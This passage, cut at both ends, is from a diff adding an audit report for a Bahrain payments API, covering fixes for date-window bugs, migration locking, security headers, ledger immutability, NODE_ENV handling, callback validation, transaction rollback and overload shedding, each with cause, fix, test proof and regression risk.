+**Proof:** `TestRebuildMerchantBalance_PersistsTheRebuiltCache` (`apps/settlement/internal/ledger/rebuild_test.go`): ledger +20,000/-500, drifted cache 999,999. Before the fix: `persisted cached_payable_fils = 999999, want 19500 (--merchant must write, not only print)`. After: returns 19,500 and persists 19,500. The ledger, settlement and internalapi packages pass, including the existing `RebuildMerchantBalance` tests (the value returned is unchanged).
+
+**Regression risk:** `--merchant` now writes, as the runbook and the code comment always said. A merchant with no cache row gets one. An unknown merchant id now fails on the `merchant_balances` foreign key instead of printing 0.
+
+Lines: prod +15/-3 (rebuild.go; 1 doc line, 1 inline comment), test +23/-0
+
+---
+
+<a id="f-date-1"></a>
+
+### DATE-1 · Report date windows include the exclusive "to" day, and bare report dates are UTC, not Bahrain days · Case file (Bahrain-midnight business day) · Severity: Low
+**Category:** Bug
+
+**What's wrong:** `GET /v1/analytics/recent-ledger-activity` returns ledger legs from the whole `to` day although every analytics window treats `to` as exclusive. The merchant transactions report (`GET /v1/reporting/transactions`) binds a bare `from`/`to` date straight into `occurred_at >= $n`, which Postgres reads as UTC midnight, so a "September" report drops 00:00-03:00 Bahrain on 1 September and adds 00:00-03:00 on 1 October.
+
+**Why it happens:** `apps/api/src/analytics/query.ts:312` (before) filtered `(occurred_at AT TIME ZONE 'Asia/Bahrain')::date BETWEEN $2::date AND $3::date`; `BETWEEN` is inclusive at both ends, while `parseDateRange` documents `to` as exclusive (`routes/analytics.ts:63`) and volumes, payout trends and top links use `< $3`. `apps/api/src/reporting/transactionsReportQuery.ts:48,52` pushed the client strings unchanged; a date-only literal cast to `timestamptz` uses the session time zone (UTC in the stack), not Asia/Bahrain.
+
+**What it breaks:** `from=2026-01-01&to=2026-01-31` returns the 31 January legs (a 777 fils leg at 09:00Z on 31 Jan in the test), so the widget double-counts a day at every month boundary when a client pages month by month. A report `from 2026-09-01 to 2026-10-01` misses a 1,000 fils capture at 01:30 Bahrain on 1 September and includes a 2,000 fils one at 01:30 on 1 October, disagreeing with the Bahrain-day settlement batches.
+
+**Why it needed a fix:** The case file sets the day boundary: "Settlement closes every day at midnight, Bahrain time (UTC+3)" (`handoff/01_CASE_FILE_TRANSCRIPT.md:43`, "Where to start"). The settlement batches therefore cover Bahrain midnight-to-midnight days, and a report that cuts at UTC midnight, or that includes its exclusive end day, shows different days from the batches it is read against.
+
+**Fix:** `apps/api/src/analytics/query.ts:312` and `apps/api/src/reporting/transactionsReportQuery.ts:48,52`
+```diff
+-        AND (occurred_at AT TIME ZONE 'Asia/Bahrain')::date BETWEEN $2::date AND $3::date
++        AND occurred_at >= ($2::date::timestamp AT TIME ZONE 'Asia/Bahrain') AND occurred_at < ($3::date::timestamp AT TIME ZONE 'Asia/Bahrain') -- DATE-1: "to" is exclusive
+```
+```diff
+-    params.push(filter.from);
++    params.push(/^\d{4}-\d{2}-\d{2}$/.test(filter.from) ? `${filter.from}T00:00:00+03:00` : filter.from); // DATE-1: a bare date is a Bahrain business day
+ ...
+-    params.push(filter.to);
++    params.push(/^\d{4}-\d{2}-\d{2}$/.test(filter.to) ? `${filter.to}T00:00:00+03:00` : filter.to);
+```
+The ledger window is now `[Bahrain midnight of from, Bahrain midnight of to)` on the raw column, which also lets `idx_ledger_entries_merchant_occurred` serve it instead of casting every row. In the transactions report only a bare `YYYY-MM-DD` bound is anchored to Bahrain midnight; a full timestamp (what the existing test and API clients send) passes through unchanged.
+
+**Why this is the smallest correct fix:** one predicate and two parameter bindings. *Why not change `parseDateRange` to make `to` inclusive?* Three other endpoints and the web client already use it as exclusive. *Why not reject timestamps in the report filter?* The existing contract (`transactionsReportQuery.test.ts` "from/to narrow the reported range, upper bound exclusive") sends full ISO timestamps.
+
+**Proof:** `DATE-1: recent-ledger-activity excludes the \`to\` day and uses Bahrain-midnight bounds` (`apps/api/src/routes/analytics.test.ts`) fails before with `actual` containing `777, 777`; `DATE-1: bare from/to dates are Asia/Bahrain midnights; full timestamps are unchanged` (`apps/api/src/reporting/transactionsReportQuery.test.ts`) fails before with the 1 October transaction instead of the 1 September one. Both pass after; analytics and report tests pass (20/20).
+
+**Regression risk:** A client that relied on the inclusive `to` of recent-ledger-activity now gets one day less, matching the documented contract. The dashboard's default window (`to` = tomorrow) still includes today.
+
+**Trap note:** `analytics/query.ts:300-302` ("this reduces to a `date` comparison per row") presented the per-row cast as harmless; the test comment at `analytics.test.ts:379` ("checks inclusive `to` (BETWEEN). API.md says exclusive — one of them is wrong — am") had spotted it.
+
+Lines: prod +3/-3, test +22/-0
+
+---
+
+<a id="f-g12"></a>
+
+### G12 · Two migration runs at once: the second fails mid-deploy · Severity: Low
+
+**Lead:** Team 45 heads-up list (G12), verified by us.
+
+**What's wrong:** `db/migrate.ts` has no mutual exclusion. When two runners start together (two replicas running migrations on boot, or a pipeline retry overlapping the first attempt), they race on the bootstrap `CREATE TABLE IF NOT EXISTS schema_migrations` and then on every pending file. The loser exits 1 with `duplicate key value violates unique constraint "pg_type_typname_nsp_index"` (or "relation already exists" / a `schema_migrations` primary-key violation further in), and the deploy step that ran it fails.
+
+**Why it happens:** `db/migrate.ts:28-34` connects, bootstraps the table, reads the applied set once, then applies each missing file in its own transaction (`:44-48`). Nothing serialises two processes: both read the same applied set and both try the same files. Two concurrent `CREATE TABLE IF NOT EXISTS` on a fresh database is not safe in Postgres (the catalog unique index rejects the second), and later the second runner's copy of a migration fails on the first runner's objects.
+
+**What it breaks:** a rollout with two instances, or an overlapping retry, fails its migration step with exit 1. We checked the lead's "corruption" claim: every file runs inside `BEGIN ... COMMIT` together with its `schema_migrations` row, and no migration contains a non-transactional statement (no `CONCURRENTLY`, `COMMIT`, `VACUUM` or `ALTER TYPE ... ADD VALUE`), so the loser's work rolls back and the schema stays consistent (78/78 rows after the race). The damage is a failed deploy, not a corrupt schema, hence Low.
+
+**Why it needed a fix:** migrations run on deploy; a deploy should not fail at random because two runners overlapped, and an operator re-running a "failed" migration by hand is how real corruption starts.
+
+**Fix:** `db/migrate.ts:32`
+```diff
+   try {
++    await client.query("SELECT pg_advisory_lock(hashtext('filspay:db/migrate.ts'))"); // G12: one runner at a time; released by client.end()
+     await bootstrapSchemaMigrationsTable(client);
+```
+The second runner waits for the first to finish, then reads the applied set, finds nothing to do and exits 0. The session-level lock is released when `client.end()` runs in the existing `finally`, or when the process dies and its connection closes.
+
+**Why this is the smallest correct fix:** one statement at the single entry point, before the first read. *Why not `ON CONFLICT`/`IF NOT EXISTS` everywhere?* It needs edits to applied migrations (forbidden) and still lets two runners apply the same data step. *Why not one transaction for the whole run?* That changes the per-file commit contract and holds every lock for the full run. *Why not a lock row in a table?* The table itself would need bootstrapping, which is the racing step.
+
+**Proof:** `G12: two concurrent migration runs on a fresh database both succeed` (`scripts/migrate_concurrent.audit.test.ts`) creates a throwaway database, spawns two `db/migrate.ts` processes at once and drops it afterwards. Before the fix: `[0, 1]` (the second exits 1). After: `[0, 0]`, run twice. A sequential re-run on the migrated test database still reports "0 migration(s) applied, 78 already up to date".
+
+**Regression risk:** a runner now waits instead of failing while another holds the lock. A runner that hangs keeps the lock for as long as its connection lives, which is the same window in which its open migration transaction already blocks others. The test needs `CREATEDB` on the local test server (the docker test role is a superuser).
+
+Lines: prod +1/-0, test +36/-0
+
+---
+
+<a id="f-sec4"></a>
+
+### SEC4 · API responses carry no nosniff, no-store or anti-framing headers · Severity: Low
+
+**Lead:** Team 45 heads-up list (SEC4), verified by us.
+
+**What's wrong:** No response from the API sets `X-Content-Type-Options`, `Cache-Control`, `X-Frame-Options` or a `Content-Security-Policy` `frame-ancestors`. Authenticated JSON (balances, transactions, payouts, API-key lists, the merchant's own session data) can be stored by browser and proxy caches, KYC documents served with their stored MIME type can be content-sniffed, and any API page can be framed by another origin.
+
+**Why it happens:** `apps/api/src/app.ts:41-51` builds the Fastify instance with cookies, multipart and the error handler only. There is no helmet-style plugin and no hook that sets response headers, and no route sets them itself (grep for `cache-control`, `nosniff`, `x-frame` in `apps/api/src` finds nothing).
+
+**What it breaks:** a shared or back-office machine keeps a merchant's `GET /v1/transactions`, `/v1/settlement/...` or `/v1/merchants/:id/api-keys` responses in its HTTP cache after logout (no `no-store`), where the next user of the browser profile or an intermediary can read them. Without `nosniff`, a KYC upload whose bytes look like HTML or script can be sniffed and rendered as such by older browsers when opened inline. Without anti-framing headers, API-origin responses can be embedded for click-jacking or UI redress.
+
+**Why it needed a fix:** the security review checks the OWASP secure-headers baseline for an authenticated payments API; these are the headers that keep cookie-authenticated financial data out of caches and frames.
+
+**Fix:** `apps/api/src/app.ts:52-55`
+```diff
+   app.setErrorHandler(errorHandler);
++  app.addHook("onSend", async (_request, reply) => { // SEC4: API responses are never sniffed, framed or cached
++    reply.header("x-content-type-options", "nosniff").header("x-frame-options", "DENY").header("content-security-policy", "frame-ancestors 'none'");
++    if (!reply.hasHeader("cache-control")) reply.header("cache-control", "no-store");
++  });
+```
+One root-level `onSend` hook, so it covers every route, including error responses. `Cache-Control: no-store` is only set when a route has not chosen its own policy.
+
+**Why this is the smallest correct fix:** one hook at the single place every response passes. *Why not add `@fastify/helmet`?* A new dependency and its default CSP (`default-src 'self'`) is a policy change beyond these four headers. *Why not per route?* Dozens of routes and every new one would forget it. *Why not `no-store` only on authenticated routes?* The public payment-link read returns a link's live status, which must not be cached either, and the hook stays one line. *CORS:* the API registers no CORS plugin and the hook adds no `Access-Control-*` header, so cross-origin behaviour is unchanged; no UI frames an API response (grep for `iframe`/`embed`/`object` in `apps/web` and `apps/admin` finds nothing).
+
+**Proof:** `SEC4: responses carry nosniff, no-store and frame-ancestors headers` (`apps/api/src/routes/securityHeaders.audit.test.ts`). Before the fix: `x-content-type-options` was `undefined`. After: passes.
+
+**Regression risk:** headers only; status codes and bodies are unchanged, so checkout and load-test behaviour are the same. `app.test.ts`, `routes/health.test.ts`, `routes/paymentLinks.test.ts`, `routes/transactions.test.ts` and `routes/acquirerCallbacks.test.ts` pass (45/45).
+
+Lines: prod +4/-0, test +52/-0
+
+---
+
+<a id="f-hunt-2"></a>
+
+### HUNT-2 · Settlement reconciliation and summary: a malformed date is a 500, an impossible date silently shifts the window · FP-300 · Severity: Low
+
+**What's wrong:** `GET /v1/settlement/reconciliation` and `GET /v1/settlement/summary` (the FP-300 reports) answer `500 internal_error` for `from=garbage` or `to=2026-10-1`, and accept `to=2026-02-31` as **3 March**: the report then silently covers a different window from the one the user asked for.
+
+**Why it happens:** both handlers (`routes/settlement.ts:58-90`) only check that `from`/`to` are present and pass the strings to `bahrainLocalMidnightUtc` (`apps/api/src/settlement/query.ts:267-273`). It builds `new Date("<s>T00:00:00+03:00")` and throws a plain `RangeError` for an Invalid Date, which the error handler turns into a 500. For a well-shaped but impossible date, V8 rolls the day over (`2026-02-30` becomes 2 March, `2026-02-31` 3 March), so no error is raised at all.
+
+**What it breaks:** API users and the dashboard's date fields (typed values) get "internal error" instead of a validation message, and any user can produce error-level 500s. With a rolled-over date, a February reconciliation (`from=2026-02-01&to=2026-02-31`) quietly includes 1-2 March, so its gap and totals disagree with the February batches.
+
+**Why it needed a fix:** these are the reports finance relies on to tie the ledger to settlement (FP-300); a wrong window must be refused, and bad input must be a 4xx.
+
+**Fix:** `apps/api/src/settlement/query.ts:2,270-271`
+```diff
+ import type { Pool } from "pg";
++import { BadRequestError } from "../lib/errors.js";
+@@
+   const parsed = new Date(`${dateStr}T00:00:00+03:00`);
+-  if (Number.isNaN(parsed.getTime())) {
+-    throw new RangeError(`bahrainLocalMidnightUtc: invalid date "${dateStr}"`);
++  if (Number.isNaN(parsed.getTime()) || new Date(parsed.getTime() + 3 * 3600_000).toISOString().slice(0, 10) !== dateStr) {
++    throw new BadRequestError("invalid_date", `"${dateStr}" is not a valid YYYY-MM-DD date`); // HUNT-2: was a RangeError (500); 2026-02-30 rolled to 2 March
+```
+The date is accepted only if the Bahrain calendar date of the computed midnight is exactly the string given, which rejects both malformed and rolled-over dates; the error is the `invalid_date` 400 used elsewhere.
+
+**Why this is the smallest correct fix:** the helper is the single place both reports turn the strings into instants, and it already had the validity check; only its condition and error class change. *Why not validate in the route?* Two handlers instead of one helper. *Why not map `RangeError` to 400 in the error handler?* `toFils` and the money helpers throw `RangeError` for server-side arithmetic faults, which must stay 500s.
+
+**Proof:** `HUNT-2: settlement reconciliation and summary reject malformed and impossible dates with 400` (`apps/api/src/routes/dateInput.audit.test.ts`). Before: `from=garbage -> 500`, `to=2026-10-1 -> 500`, `to=2026-02-31 -> 200`. After: all `-> 400`.
+
+**Regression risk:** valid `YYYY-MM-DD` dates (what the dashboard's `<input type="date">` and default range send, `apps/web/src/pages/settlement/ReconciliationPage.tsx:22-26,93-97`) compute the same instants as before. `routes/settlement.test.ts`, `routes/settlement.refunds.audit.test.ts` and `settlement/*.test.ts` pass (17/17 with the new tests).
+
+Lines: prod +3/-2, test +12/-0
+
+---
+
+<a id="f-led-1"></a>
+
+### LED-1 · Hardening: the ledger table allows UPDATE and DELETE as long as each group still balances · Severity: Medium
+**Category:** Hardening
+
+**What's wrong:** `ledger_entries` accepts UPDATE and DELETE. Nothing stops someone from rewriting history: scaling a whole posting ×10, back-dating it, or deleting it.
+
+**Why it happens:** `db/migrations/0007_ledger_double_entry.sql:38-70` installs one deferred trigger that only checks that each entry group still nets to 0. Its comment (`:72-74`) claims "Immutability: ... an edited or removed leg unbalances its group ... No separate reject trigger or REVOKE is needed". That is true for one leg, false for a whole group: multiply both legs by 10, or delete both, and the group still balances, so the commit succeeds.
+
+**What it breaks:** nothing today: no application code, script or migration updates or deletes ledger rows (see the runtime verification below), so this is hardening, not a live defect. The ledger is the source of truth that BAL-1, reconciliation and the payout netting rely on, and the database itself did not protect it. Case file F2 is not this problem: the March sweep that "ran twice" inserted a second set of rows, which an append-only trigger does not prevent (that is F2-SWEEP). Worked example (from the test): a balanced 1,000-fil group rewritten to 10,000 fils committed without error.
+
+**Why we hardened it:** a financial ledger whose rows can be rewritten cannot prove anything to finance or auditors, and the 0007 comment claimed a guarantee the schema did not give.
+
+**Fix:** new migration `db/migrations/0084_ledger_entries_append_only.sql`: a `BEFORE UPDATE OR DELETE ... FOR EACH ROW` trigger that raises "ledger_entries is append-only: post a compensating entry instead". Lines: SQL +11 (6 code, 5 comment/blank), test +44.
+
+**Why this is the smallest correct fix:** one trigger at the table, independent of every caller. No application code or test updates or deletes ledger rows (repo-wide grep), and TRUNCATE (dev seed) is not a row operation. Why not REVOKE UPDATE/DELETE: every service connects as the table owner (single DB role in compose), and owners bypass grants.
+
+**Proof:** `scripts/ledger_append_only.audit.test.ts` "ledger entries are append-only: balanced edits and deletes are rejected": before `Missing expected rejection: UPDATE ledger_entries SET amount_fils = amount_fils * 10 ...`; after both statements are rejected (run in rolled-back savepoints).
+
+**Regression risk:** the only writer that updated ledger rows was the FP-300 demo's labelled "DEMO-ONLY" back-dating step (`ops/demo.sh`), which now disables and re-enables this trigger around that one statement, in plain sight. Fixing a wrong posting now requires a compensating group, which is the documented accounting rule.
+
+**Trap note:** the "Immutability" comment in 0007 (`:72-74`) is false for whole-group edits. 0007 is an applied migration, so the comment is left in place and corrected here.
+
+**Runtime verification (advisor check, 2026-10-30):** repo-wide grep finds no UPDATE or DELETE on `ledger_entries` in TS, Go, scripts or migrations ≥ 0084 (RecalculateMDR posts compensating INSERTs, `recalculate_mdr.go:167-189`). On the compose stack with 0084 applied, the real flows ran with **0 append-only rejections** in the api, settlement and reporting logs: `settlement run-batch` (close + pay, refund netting), `settlement rebuild-balances` (all merchants), `/internal/recalculate-mdr` (200), `scripts/reconcile_march.ts` (sweep inserts), the FP-300 refund flow, and the full `ops/demo.sh`. The demo's box-3 time travel no longer touches the ledger: it backdates only the settlement inputs that CloseBatch selects (`transaction_events.occurred_at`, `refunds.occurred_at`, `batch.go:152-158, 225-226`), so the trigger is never disabled. Fresh compose database (77 migrations, seed, demo): 32 PASS / 0 FAIL.
+
+---
+
+<a id="f-cfg-1"></a>
+
+### CFG-1 · Hardening: any unknown NODE_ENV (for example "prod") silently boots as development: OTP codes in responses, non-Secure cookies, production checks skipped · H8 · Severity: Medium
+
+**Lead:** Team 45 heads-up list (P11), verified by us.
+**Category:** Hardening
+
+**What's wrong:** `parseNodeEnv` mapped every value other than the exact strings `production`, `test` and `development` to `development`. A deployment with `NODE_ENV=prod`, `Production` or `staging` booted with no error as a development server.
+
+**Why it happens:** `apps/api/src/config.ts:121-126` falls through to `return "development"` for any string. Every security default keys off `nodeEnv`: `otpDevExpose` defaults to `nodeEnv !== "production"` (`config.ts:210`), so `devOtpCode` goes into the login response (`routes/auth.ts:111-113`, and the admin twin). `cookieSecure` defaults to `nodeEnv === "production"` (`:228`). The required-secret checks for `SETTLEMENT_INTERNAL_TOKEN` and `ACQUIRER_CALLBACK_SIGNING_SECRET` run only when `nodeEnv === "production"` (`:186-192`). The webhook-secret key falls back to a public dev key (`:248`). The notifier comment at `auth/notifier.ts:14-15` shows staging already ran with NODE_ENV unset or misconfigured.
+
+**What it breaks:** An operator sets `NODE_ENV=prod`. `POST /v1/auth/login` now returns `{"otpRequired":true,"devOtpCode":"482913"}`, so the second factor is handed to whoever knows the password (H8). Session cookies are sent without `Secure`. The service also boots without the settlement token and the acquirer signing secret, and encrypts webhook secrets under the dev key committed in the repo. There is no error and no log line.
+
+**Why it needed a fix:** H8 asks whether OTP is still safe. A one-character configuration typo should never disable two-factor auth and the production secret checks without a word. A configuration error must fail loudly at boot.
+
+**Fix:** `apps/api/src/config.ts:125`
+```diff
+     return value;
+   }
++  if (value) throw new Error(`loadConfig: unknown NODE_ENV "${value}" (expected production, test or development)`); // CFG-1
+   return "development";
+ }
+```
+
+**Why this is the smallest correct fix:** One line at the single parser every config value depends on. Only an unset or empty `NODE_ENV` still defaults to development, so local `npm run dev`, tests that omit it, and `ops/demo.sh` and `ops/smoke.sh` behave as before. *Why not map unknown values to production (fail closed)?* That would silently turn a typo'd dev box into production mode, where it then fails on missing secrets with a misleading message. An explicit error names the actual problem. *Why not normalise case or aliases (`prod` → `production`)?* That guesses intent, and it is more code. Checked: `ops/.env.docker:9` and `ops/.env.production.example:3` set `NODE_ENV=production`, and `loadConfig` with each still boots. Compose and `Dockerfile.node` set no other value. All 30 test files pass `NODE_ENV: "test"`, and `config.audit.test.ts` passes `"development"`.
+
+**Proof:** `CFG-1: an unknown NODE_ENV is refused; an unset one still defaults to development` (`apps/api/src/config.audit.test.ts`).
+Before: `not ok 2 ... error: 'Missing expected exception.'` (`NODE_ENV=prod` loaded as development).
+After: `ok 2`. The file passes 2/2, and both ops env files boot.
+
+**Regression risk:** Low. A deployment that currently relies on an unrecognised `NODE_ENV` will now refuse to boot with a clear message. That is the intent: such a deployment was running with dev security defaults.
+
+Lines: prod +1/-0, test +7/-0
+
+---
+
+<a id="f-cw-11"></a>
+
+### CW-11 · Hardening: acquirer callback `outcome` and `occurredAt` are never validated, so any string is stored as a verdict note · Severity: Low
+**Category:** Hardening
+
+**What's wrong:** `POST /v1/acquirer/callbacks` checked only that `outcome` and `occurredAt` were present. Any signed callback with `outcome: "approved"` (or `"void_now"`, or anything else) was stored in `acquirer_callback_notes` as the acquirer's fraud verdict. (The docblock at `acquirer/callbacks.ts:21` says the notes are "surfaced on the transaction timeline"; no code reads the table back today, so nothing displays or acts on the bad rows yet.) `occurredAt` went straight into the `received_at` timestamptz, so Postgres special literals such as `"yesterday"` were stored silently as midnight yesterday, and other junk strings raised a DB error that was retried three times and then surfaced as a 500.
+
+**Why it happens:** `apps/api/src/routes/acquirerCallbacks.ts:48-60` tests only truthiness, then `:76` casts `body.outcome as AcquirerCallbackInput["outcome"]`, and TypeScript casts do nothing at runtime. Two comments claimed validation that did not exist: the route doc (`acquirerCallbacks.ts:10-12`, which even names a different union, "approved" | "rejected") and `acquirer/callbacks.ts:4` ("Validated against the two allowed values by the route schema"; no route schema exists). The column has no CHECK (`db/migrations/0051_acquirer_callback_notes.sql:20`).
+
+**What it breaks:** A signed callback with `outcome: "approved"` gets 200 `{received:true}`, and a note row with outcome `approved` is written: a verdict that no consumer would understand, next to `cleared` and `confirmed_fraud`. A callback with `occurredAt: "yesterday"` gets 200, and the note is backdated to midnight. The audit test observed both before the fix (`200 notes=1` for each). A malformed timestamp such as `"not-a-date"` becomes a retried 500, which makes the acquirer retry a payload that can never succeed.
+
+**Why we hardened it:** The note table is the only record of the acquirer's delayed verdict. Nothing reads it yet and no status or ledger row changes (`acquirer/callbacks.ts` only inserts the note), so this is hardening rather than a money defect: accepting free-form verdicts and unparseable times corrupts that record and turns a sender bug into a retry loop.
+
+**Fix:** `apps/api/src/routes/acquirerCallbacks.ts:11, 62-65`
+```diff
+- * the AcquirerCallbackInput union ("approved" | "rejected") before it is
++ * the AcquirerCallbackInput union ("cleared" | "confirmed_fraud") before it is
+ ...
++    // CW-11: the outcome union and occurredAt were never checked at runtime (the cast below is type-only)
++    if ((body.outcome !== "cleared" && body.outcome !== "confirmed_fraud") || !/^\d{4}-\d{2}-\d{2}T/.test(body.occurredAt) || Number.isNaN(Date.parse(body.occurredAt))) {
++      throw new BadRequestError("invalid_request", "outcome must be cleared or confirmed_fraud and occurredAt an ISO-8601 timestamp");
++    }
+```
+
+**Why this is the smallest correct fix:** A single guard sits next to the existing required-field check and returns the same 400 `invalid_request` shape the route already uses. The comment fix keeps the route's only documentation of the check truthful. *Why not `Date.parse` alone?* JavaScript accepts non-ISO forms such as `"Sep 16 2026"`, and Postgres parses some of them differently. Requiring the `YYYY-MM-DDT` ISO prefix and a parseable value pins the contract. *Why not a migration CHECK on `outcome` (the lead's suggestion)?* With the route as the only writer, the guard closes the hole. A CHECK violation would also come back through `withCallbackRetry` as a retried 500 instead of a 400, and a new migration adds schema churn. *Why not also store `now()` as `received_at`?* That changes what the existing column means and what timeline readers see. It is a separate design decision, outside this validation bug.
+
+**Proof:** `CW-11: a signed callback with an unknown outcome or an unparseable occurredAt is a 400 and stores nothing` (`apps/api/src/routes/acquirerCallbacks.test.ts`).
+Before: `actual: ['{"outcome":"approved"} -> 200  notes=1', '{"occurredAt":"yesterday"} -> 200  notes=1']`.
+After: both cases give `400 invalid_request notes=0`. `routes/acquirerCallbacks.test.ts` passes 7/7 and `acquirer/callbacks.test.ts` passes.
+
+**Regression risk:** Low. Valid callbacks (`cleared` or `confirmed_fraud` with an ISO timestamp, as the existing tests and the acquirer contract send) are unchanged. Only callbacks that were already semantically invalid are refused.
+
+Lines: prod +5/-1, test +21/-0
+
+---
+
+<a id="f-txn-1"></a>
+
+### TXN-1 · Hardening: withTransaction lets a failing ROLLBACK mask the real error and returns the broken client to the pool · Severity: Low
+
+**Lead:** Team 45 heads-up list (C7), verified by us.
+**Category:** Hardening
+
+**What's wrong:** When `fn` throws, `withTransaction` awaits `ROLLBACK` before rethrowing. If the `ROLLBACK` itself throws (connection reset, server restart, pool timeout), that error replaces the original one. The caller and the error log then report "rollback failed" instead of the unique violation or bug that actually aborted the write. The client is also released with a plain `release()`, so a connection left in an unknown transaction state can go back into the pool.
+
+**Why it happens:** `apps/api/src/db/withTransaction.ts:33-38` (before the fix) ran `await client.query("ROLLBACK"); throw err;` in the catch, so a rejection at the first line skips the second. The `finally` calls `client.release()` with no error. pg-pool destroys a client only when it gets an error or the connection is already flagged unusable (`pg-pool/index.js:392`), so a live connection whose ROLLBACK failed is pooled again. The comment thread above the function names exactly this (FH: "ROLLBACK can itself throw and mask the original error", am: "release(err)"), and it was dismissed without a fix.
+
+**What it breaks:** Every multi-statement write in the API (capture, refund, payment-link pay, signup, KYC review, admin actions) runs through this helper. During a database blip, an error-mapping branch such as `isUniqueViolation` in `onboarding/signup.ts:107-114`, or any AppError thrown inside `fn` (409, 422 and so on), gets the rollback error instead. A request that should have returned a clean 4xx turns into a 500, and the real root cause never reaches the logs. If the connection is still alive after the failed ROLLBACK, the next request that borrows it starts inside an aborted transaction and fails too.
+
+**Why it needed a fix:** On money paths the cause of a failed write is the thing operators need, and a poisoned pooled connection spreads one failure to unrelated requests.
+
+**Fix:** `apps/api/src/db/withTransaction.ts:26, 35, 39`
+```diff
+   const client = await pool.connect();
++  let releaseErr: Error | undefined; // TXN-1: set when ROLLBACK fails, so pg destroys the client
+   try {
+ ...
+     } catch (err) {
+-      await client.query("ROLLBACK");
++      await client.query("ROLLBACK").catch((rollbackErr: Error) => { releaseErr = rollbackErr; }); // TXN-1: never mask err
+       throw err;
+     }
+   } finally {
+-    client.release();
++    client.release(releaseErr);
+   }
+```
+
+**Why this is the smallest correct fix:** Three lines in the one helper every transactional write uses. The original error is always rethrown, and the rollback failure is passed to `release(err)`, the documented pg-pool way to destroy rather than recycle a client (this is am's suggestion in the comment thread). *Why not just swallow the ROLLBACK error (`.catch(() => {})`)?* That fixes the masking but still pools a client in an unknown state. *Why not log the rollback error?* `withTransaction` has no logger, and adding one changes its signature for every caller. pg-pool also emits it through the destroy path. The happy path and the normal rollback path are byte-for-byte unchanged: `release(undefined)` is `release()`.
+
+**Proof:** `TXN-1: a ROLLBACK failure neither masks the original error nor returns the client to the pool` (`apps/api/src/db/withTransaction.audit.test.ts`, a unit test with a stub client whose ROLLBACK rejects).
+Before: `actual: { thrown: 'rollback failed: connection reset', released: [undefined] }`.
+After: `{ thrown: 'insert failed: unique violation', released: [rollbackErr] }`. `db/pool.test.ts` and `routes/auth.audit.test.ts` pass, and `tsc --noEmit` is clean. The full API suite exercises the helper on every write path.
+
+**Regression risk:** Very low. Behaviour changes only when ROLLBACK itself fails: the caller then sees the original error, and the connection is discarded and replaced by the pool.
+
+Lines: prod +3/-2, test +30/-0
+
+---
+
+<a id="f-cap-2"></a>
+
+### CAP-2 · Under overload the API queues every request until it times out instead of turning the excess away · Severity: High
+**Category:** Capacity work
+
+**What's wrong:** The API had no admission control. Every request that reached the socket was accepted and parked, either on the event loop or in the `pg` pool's wait queue (`max: PG_POOL_MAX`, waiting up to `PG_POOL_CONNECTION_TIMEOUT_MS` = 5 s). Past capacity, latency climbed for every caller at once. Requests then failed after seconds with a 500 (`timeout exceeded when trying to connect`) or a client timeout, and the backlog kept growing in memory inside a 512 MB container.
+
+**Why it happens:** `buildApp` (`apps/api/src/app.ts`) registers no `onRequest` limit, and `@fastify/under-pressure` is not installed. A checkout holds a pool connection for the whole authorize or capture transaction, including the simulated acquirer call (100-400 ms each, `acquirer/simulator.ts`). So throughput is bounded at roughly `PG_POOL_MAX / ~0.6 s`, while admission is unbounded.
+
+**What it breaks:** The judged overload test ("push past your limit and see whether your stack turns away the excess"). Without a cap, a load spike slows down every buyer, including those already within capacity. Failures arrive late, as 5xx after up to 5 s or as client timeouts, so a client cannot tell "rejected, nothing written" from "may have been charged". Memory grows with the backlog.
+
+**Why it needed a fix:** Capacity and hosting are scored on staying fast and correct at the limit and on turning the excess away. A fast 503 with `Retry-After`, sent before any write, gives the client a definite "nothing happened, retry later". With the existing Idempotency-Key handling, a retried checkout cannot double-charge.
+
+**Fix:** `apps/api/src/app.ts:49-56`, `apps/api/src/config.ts:16,202`
+```diff
++  // CAP-2: past a global (never per-IP) in-flight cap, answer 503 before any handler, so before any write. /healthz is exempt.
++  let inFlight = 0;
++  app.addHook("onRequest", async (request, reply) => {
++    if (request.routeOptions.url === "/healthz") return;
++    if (inFlight >= config.maxInFlight) return reply.code(503).header("retry-after", "1").send({ error: "overloaded" });
++    inFlight++;
++    reply.raw.once("close", () => inFlight--);
++  });
+```
+`config.ts` adds `maxInFlight` (`MAX_IN_FLIGHT`, default 64). The hosted override sets 32 because throughput peaked at about 30 requests in flight (`docs/audit/CAPACITY.md`). `onRequest` is the first hook in Fastify's lifecycle. It runs before body parsing, before preHandlers (auth) and before the route handler, so a shed request never touches the database. The counter is decremented on the raw response's `close` event, which Node emits once for every response: finished, errored or aborted by the client. A disconnecting client therefore cannot leak a slot. `/healthz` (liveness) is exempt, so the container's health check does not see a saturated API as dead. `/readyz` is not exempt, so it returns 503 while the API is saturated. That is a meaningful readiness signal for a load balancer.
+
+**Why this is the smallest correct fix:** One hook at the single entry point that every route passes through. *Why not `@fastify/under-pressure`?* It is not installed (no new dependencies), and event-loop-delay shedding reacts late here: the bottleneck is the pool queue, not CPU. *Why not shrink the pool queue (`connectionTimeoutMillis`)?* That rejects requests in the middle of a handler, after auth and possibly after earlier writes in a multi-step checkout (link reserved, authorization written). The client then gets a 500, not a clean 503. *Why not a per-IP rate limit?* The graders load-test from a few IPs, and a per-IP limit would turn away legitimate users without protecting capacity. *Why not a queue with a wait timeout?* More code, and a shed request should be answered at once.
+
+**Proof:** `CAP-2: requests over MAX_IN_FLIGHT get 503 + Retry-After before the handler runs; /healthz is never shed` (`apps/api/src/app.shed.audit.test.ts`), with `MAX_IN_FLIGHT=1` and a test route that blocks on a gate:
+- Before the fix, the second request was admitted and blocked inside the handler. The test's 2 s abort fired (`not ok 1`).
+- After the fix, the second request gets `503`, `retry-after: 1` and `{"error":"overloaded"}`, and the handler ran only once. `/healthz` still answers 200 while the API is saturated, and once the first request completes the next one is admitted (200).
+- Under real load (0.5 vCPU / 512 MB), see `docs/audit/CAPACITY.md`: the 503s are answered in milliseconds, and the SQL and API checks after the overload run show no lost or doubled capture.
+
+**Regression risk:** At most `MAX_IN_FLIGHT` requests are processed concurrently. Below the cap nothing changes. The cap is per process, and the box runs a single replica. Fastify `inject` emits `close` as well, so route tests are unaffected: `src/app.test.ts` and `paymentLinks/pay.test.ts` pass, and `tsc --noEmit` is clean.
+
+Lines: prod +11/-0, test +58/-0
+
+---
+
+<a id="f-cap-4"></a>
+
+### CAP-4 · Every capture scans the whole ledger four times and the whole holds table once, so checkout capacity falls as the ledger grows · Severity: High
+**Category:** Capacity work
+
